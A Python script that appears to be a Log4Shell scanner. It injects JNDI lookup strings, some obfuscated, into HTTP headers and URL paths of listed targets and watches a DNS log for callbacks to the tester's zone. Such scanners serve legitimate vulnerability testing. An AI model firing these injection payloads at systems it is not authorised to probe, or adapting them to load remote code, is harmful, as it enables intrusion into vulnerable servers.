#!/usr/bin/python3
import requests
import uuid
import logging
import urllib3
import time
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

# Change this to your DNS zone
HOSTNAME = "yourdns.zone.here"

header_injects = [
    'X-Api-Version',
    'User-Agent',
    'Referer',
    'X-Druid-Comment',
    'Origin',
    'Location',
    'X-Forwarded-For',
    'Cookie',
    'X-Requested-With',
    'X-Forwarded-Host',
    'Accept'
]

prefixes_injects = [
    'jndi:rmi',
    'jndi:ldap',
    'jndi:dns',
    'jndi:${lower:l}${lower:d}ap'
]

def send_request(url, headers={}, timeout=5):
    try:
        """
        Check inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
        """
        requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=timeout
        )
    except (requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
        logging.error(f"HTTP connection to target URL error: {e}")
    except requests.exceptions.Timeout:
        logging.error("HTTP request timeout")
    except (requests.exceptions.InvalidURL, urllib3.exceptions.LocationParseError) as e:
        logging.error(f"Failed to parse URL: {e}")

def check_urls(urls, wait, timeout):
    url_identifiers=dict()

    for url in urls:
        url_identifiers[url] = uuid.uuid4()
        logging.debug(f"Generated UUID: {url_identifiers[url]} for {url}")
        logging.info(f"Sending requests to {url} using header injection...")

        # Check 1 (Header fields)
        for header in header_injects:
            for prefix in prefixes_injects:
                logging.info(f"Trying prefix {prefix} with header {header}")
                headers = {header: f'${{{prefix}://{url_identifiers[url]}.{HOSTNAME}/test.class}}'}
                send_request(url=url, headers=headers, timeout=timeout)

        # Check 2 (Get request)
        logging.info(f"Sending requests to {url} using GET request injection")
        for prefix in prefixes_injects:
            logging.info(f"Trying prefix {prefix}")
            send_request(url=f"{url}/${{{prefix}://{url_identifiers[url]}.{HOSTNAME}/test.class}}", timeout=timeout)

    logging.info(f"Waiting {wait} seconds for responses")
    time.sleep(wait)

    for url in urls:
        logging.info(f"Checking DNS log file for requests for {url} (indicating a vulnerable system)...")
        with open('/var/log/named/query.log') as f:
            if f"{url_identifiers[url]}" in f.read():
                logging.info(f"VULNERABLE! System at {url} is potentially vulnerable as we have seen an incoming DNS request to {url_identifiers[url]}.{HOSTNAME}")
            else:
                logging.info(f"NOT VULNERABLE! No incoming DNS request to {url_identifiers[url]}.{HOSTNAME} was seen while checking system at {url}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--list", help="A text file with a list of URLs to check (one url per line)")
    parser.add_argument("-u", "--url", help="URL to check (for example: http://yoururl.com)")
    parser.add_argument("-w", "--wait", type=int, default=15, help="Number of seconds to wait before checking DNS logs (default: 15)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="HTTP timeout in seconds to use (default: 5)")
    args = parser.parse_args()

    if(args.url):
        urls = [args.url]
    elif(args.list):
        with open(args.list) as f:
            urls = f.read().splitlines()
    else:
        parser.print_help()
        exit(1)

    check_urls(urls, wait=args.wait, timeout=args.timeout)

if __name__ == "__main__":
    main()
